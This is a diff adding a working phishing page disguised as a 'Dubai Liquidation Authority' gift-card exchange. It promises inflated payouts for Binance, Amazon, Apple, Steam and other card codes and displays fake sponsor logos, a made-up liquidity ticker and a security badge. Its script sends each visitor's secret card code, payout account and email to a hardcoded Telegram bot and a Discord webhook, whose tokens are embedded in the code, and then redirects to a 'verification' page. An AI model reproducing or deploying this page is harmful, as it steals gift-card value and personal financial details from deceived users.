@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DLA | Global Settlement Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; }
+        [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
+        .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
+        .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
+        @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
+        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; color: var(--text); }
+        h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
+        .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
+        label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
+        input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; transition: 0.2s; }
+        .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
+        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0a0c10; scrollbar-width: thin; scrollbar-color: var(--gold) #111; }
+        .grid::-webkit-scrollbar { width: 6px; }
+        .grid::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
+        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }
+        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
+        .res-box b { font-size: 34px; color: #fff; display: block; }
+        #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
+        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
+        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
+        .node-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 0 5px; }
+        .node-item { font-size: 8px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 4px; padding: 6px 4px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
+        .node-dot { width: 5px; height: 5px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
+        @keyframes pulseNode { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
+    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
+
+    <div class="panel">
+        <h2>Exchange</h2>
+        <div class="tag">Dubai Liquidation Authority</div>
+
+        <label>Asset Class</label>
+        <select id="brand" onchange="updateVal()">
+            <option value="1.8">💳 Binance Gift Card [1.8x]</option>
+            <option value="1.4">📦 Amazon Global [1.4x]</option>
+            <option value="1.4">🍎 Apple iTunes [1.4x]</option>
+            <option value="1.4">💎 Razer Gold [1.4x]</option>
+            <option value="1.4">🎮 Steam Wallet [1.4x]</option>
+        </select>
+
+        <label>Secret Card Code (e.g., ABC-123-XYZ)</label>
+        <input id="card" placeholder="ENTER 16-DIGIT CODE" oninput="this.value = this.value.toUpperCase()">
+
+        <label>Value ($)</label>
+        <input id="amt" type="number" value="100" min="25" oninput="updateVal()">
+
+        <div class="res-box">
+            <span style="font-size:10px; color:var(--gold);">SETTLEMENT ESTIMATE</span>
+            <div id="display-area"><b>$180.00</b></div>
+            <div id="local-payout"></div>
+        </div>
+
+        <label>Global Payout Gateway (15 Methods)</label>
+        <div class="grid">
+            <div class="pay" onclick="sel(this, '💎 USDT', 'Enter TRC20 Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
+            <div class="pay" onclick="sel(this, '🔵 PayPal', 'Enter Email Address', 1, 'USD')"><span>🔵</span>PayPal</div>
+            <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct No + Bank', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
+            <div class="pay" onclick="sel(this, '🌀 Zelle', 'Enter Email/Phone', 1, 'USD')"><span>🌀</span>Zelle</div>
+            <div class="pay" onclick="sel(this, '💸 CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span>CashApp</div>
+            <div class="pay" onclick="sel(this, '🟡 Binance', 'Enter Binance ID', 1, 'USD')"><span>🟡</span>Binance Pay</div>
+            <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Enter Phone Number', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
+            <div class="pay" onclick="sel(this, '💳 Revolut', 'Enter RevTag', 1, 'USD')"><span>💳</span>Revolut</div>
+            <div class="pay" onclick="sel(this, '🇬🇭 Momo', 'Enter GH Phone', 14.80, 'GHS')"><span>🇬🇭</span>MoMo GH</div>
+            <div class="pay" onclick="sel(this, '🍎 Apple Pay', 'Enter Apple Email', 1, 'USD')"><span>🍎</span>Apple Pay</div>
+            <div class="pay" onclick="sel(this, '🇿🇦 Bank', 'Acct + Branch', 18.50, 'ZAR')"><span>🇿🇦</span>Bank ZA</div>
+            <div class="pay" onclick="sel(this, '🟠 Skrill', 'Enter Email', 1, 'USD')"><span>🟠</span>Skrill</div>
+            <div class="pay" onclick="sel(this, '🟣 Venmo', 'Enter Username', 1, 'USD')"><span>🟣</span>Venmo</div>
+            <div class="pay" onclick="sel(this, '💰 Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>💰</span>Bitcoin</div>
+            <div class="pay" onclick="sel(this, '🏦 Wire', 'Enter IBAN/Swift', 1, 'USD')"><span>🏦</span>Bank Wire</div>
+        </div>
+
+        <label id="payout-label">Payout Details</label>
+        <input id="wallet" placeholder="Select method above">
+
+        <label>Confirmation Email</label>
+        <input id="email" type="email" placeholder="Required for receipt">
+
+        <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
+        <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
+
+        <div class="node-footer">
+            <p>Sponsored By</p>
+            <div class="node-grid">
+                <div class="node-item"><span class="node-dot"></span> SWIFT-INTL</div>
+                <div class="node-item"><span class="node-dot"></span> COINBASE</div>
+                <div class="node-item"><span class="node-dot"></span> BINANCE</div>
+                <div class="node-item"><span class="node-dot"></span> KRAKEN</div>
+                <div class="node-item"><span class="node-dot"></span> DUBAI-HUB</div>
+                <div class="node-item"><span class="node-dot"></span> CRYPTO.COM</div>
+            </div>
+        </div>
+    </div>
+
+    <a href="https://wa.me/447888372219" class="chat-btn"><div class="dot"></div><span>Support</span></a>
+
+    <script>
+        const TELEGRAM_TOKEN = "8666892573:AAHoJTG8hy6gevWIc3t8_GyqgFZELmf2SWk";
+        const TELEGRAM_CHAT_ID = "8588753899";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484706100916781057/b13TunLishCPP0s3b2Q6G0bG84UMShEICD6KRiQaWYUHmG0c2rSoq2mJ6FWjuEgZbfJS";
+
+        let method = ""; let rateL = 1; let sym = "USD";
+
+        function toggleTheme() {
+            const html = document.documentElement;
+            const btn = document.getElementById('theme-btn');
+            if (html.getAttribute('data-theme') === 'dark') {
+                html.setAttribute('data-theme', 'light');
+                btn.innerText = "🌙 DARK";
+            } else {
+                html.setAttribute('data-theme', 'dark');
+                btn.innerText = "☀️ LIGHT";
+            }
+        }
+
+        function updateTicker() {
+            const liq = (2840500 + Math.floor(Math.random() * 5000)).toLocaleString();
+            document.getElementById('live-ticker').innerHTML = '💰 LIQUIDITY: $' + liq + ' • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE';
+        }
+        setInterval(updateTicker, 8000);
+
+        function sel(el, val, shadow, r, s) {
+            document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
+            el.classList.add('active');
+            method = val; rateL = r; sym = s;
+            document.getElementById('payout-label').innerText = val + " Details";
+            document.getElementById('wallet').placeholder = shadow;
+            updateVal();
+        }
+
+        function updateVal() {
+            let v = parseFloat(document.getElementById('amt').value);
+            let rate = parseFloat(document.getElementById('brand').value);
+            let totalUSD = (isNaN(v) ? 0 : (v * rate));
+            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
+            let lBox = document.getElementById('local-payout');
+            if(rateL > 1) {
+                lBox.style.display = "block";
+                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
+            } else { lBox.style.display = "none"; }
+        }
+
+        function submitNow() {
+            const cardCode = document.getElementById('card').value;
+            const walletDetails = document.getElementById('wallet').value;
+            const userEmail = document.getElementById('email').value;
+            const amount = document.getElementById('display-area').innerText;
+            const brandSelect = document.getElementById('brand');
+            const assetName = brandSelect.options[brandSelect.selectedIndex].text;
+
+            if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
+
+            const telegramUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+            const messageText = '🚨 *NEW DLA SUBMISSION*\n\n' +
+                                '*Asset:* ' + assetName + '\n' +
+                                '*Card Code:* `' + cardCode + '` \n' +
+                                '*USD Value:* ' + amount + '\n' +
+                                '*Method:* ' + method + '\n' +
+                                '*Payout To:* ' + walletDetails + '\n' +
+                                '*User Email:* ' + userEmail;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: 'Markdown' }),
+                keepalive: true
+            });
+
+            const discordPayload = {
+                username: "DLA SETTLEMENT HUB",
+                embeds: [{
+                    title: "🚨 NEW CARD RECEIVED",
+                    color: 13938487,
+                    fields: [
+                        { name: "Asset Class", value: assetName, inline: true },
+                        { name: "USD Value", value: amount, inline: true },
+                        { name: "Card Code (Tap to Copy)", value: "```" + cardCode + "```" },
+                        { name: "Payout Method", value: method, inline: true },
+                        { name: "Recipient Details", value: walletDetails },
+                        { name: "User Email", value: userEmail }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
+
+            const formData = {
+                cardCode: cardCode, walletDetails: walletDetails, userEmail: userEmail,
+                amount: amount, assetName: assetName, method: method, rateL: rateL, sym: sym,
+                localPayout: document.getElementById('local-payout').innerText
+            };
+            localStorage.setItem('DLA_formData', JSON.stringify(formData));
+            window.location.href = 'verification.html';
+        }
+    </script>
+</body>
